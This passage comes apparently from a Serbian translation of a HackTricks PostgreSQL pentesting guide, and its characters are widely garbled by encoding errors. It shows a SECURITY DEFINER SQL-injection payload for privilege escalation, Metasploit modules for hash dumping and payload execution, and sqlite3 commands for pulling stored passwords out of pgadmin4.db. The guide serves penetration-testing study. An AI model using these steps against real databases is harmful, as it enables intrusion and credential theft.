PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

Kao ≈°to je [obja≈°njeno u dokumentaciji](https://www.postgresql.org/docs/current/sql-createfunction.html), funkcija sa **SECURITY DEFINER oznakom se izvr≈°ava** sa privilegijama **korisnika koji je vlasnik funkcije**. Stoga, ako je funkcija **ranjiva na SQL Injection** ili izvr≈°ava **privilegovane akcije sa parametrima koje kontroli≈°e napadaƒç**, mo≈æe se zloupotrebiti za **poveƒáanje privilegija unutar postgresa**.

Na liniji 4 prethodnog koda mo≈æete videti da funkcija ima **SECURITY DEFINER oznaku**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
I onda **izvr≈°ite komande**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Proƒëite kroz Burteforce sa PL/pgSQL

**PL/pgSQL** je **potpuno opremljen programski jezik** koji nudi veƒáu proceduralnu kontrolu u odnosu na SQL. Omoguƒáava upotrebu **petlji** i drugih **kontrolnih struktura** radi pobolj≈°anja logike programa. Osim toga, **SQL izjave** i **okidaƒçi** imaju moguƒánost da pozovu funkcije koje su kreirane koristeƒái **PL/pgSQL jezik**. Ova integracija omoguƒáava sveobuhvatan i fleksibilan pristup programiranju i automatizaciji baza podataka.\
**Mo≈æete zloupotrebiti ovaj jezik kako biste zatra≈æili od PostgreSQL-a da izvr≈°i brute-force napad na korisniƒçke podatke.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### bele≈æenje

Unutar datoteke _**postgresql.conf**_ mo≈æete omoguƒáiti bele≈æenje postgresql logova promenom:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Zatim, **ponovo pokrenite servis**.

### pgadmin

[pgadmin](https://www.pgadmin.org) je platforma za administraciju i razvoj PostgreSQL baze podataka.\
Mo≈æete pronaƒái **lozinke** unutar datoteke _**pgadmin4.db**_.\
Mo≈æete ih de≈°ifrovati koristeƒái funkciju _**decrypt**_ unutar skripte: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

Klijentska autentifikacija u PostgreSQL-u se upravlja putem konfiguracione datoteke nazvane **pg_hba.conf**. Ova datoteka sadr≈æi niz zapisa, pri ƒçemu svaki zapis specificira tip konekcije, opseg IP adresa klijenta (ako je primenljivo), naziv baze podataka, korisniƒçko ime i metod autentifikacije koji se koristi za uparivanje konekcija. Prvi zapis koji se podudara sa tipom konekcije, IP adresom klijenta, tra≈æenom bazom podataka i korisniƒçkim imenom se koristi za autentifikaciju. Ne postoji rezervna ili rezervna opcija ako autentifikacija ne uspe. Ako nijedan zapis ne odgovara, pristup je odbijen.

Dostupni metodi autentifikacije zasnovani na lozinkama u pg_hba.conf su **md5**, **crypt** i **password**. Ovi metodi se razlikuju u naƒçinu prenosa lozinke: MD5 he≈°irana, kriptovana kriptografijom ili ƒçisti tekst. Va≈æno je napomenuti da metoda crypt ne mo≈æe se koristiti sa lozinkama koje su ≈°ifrovane u pg_authid.

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **ogla≈°avanje va≈°e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** koji se pokreƒáu najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
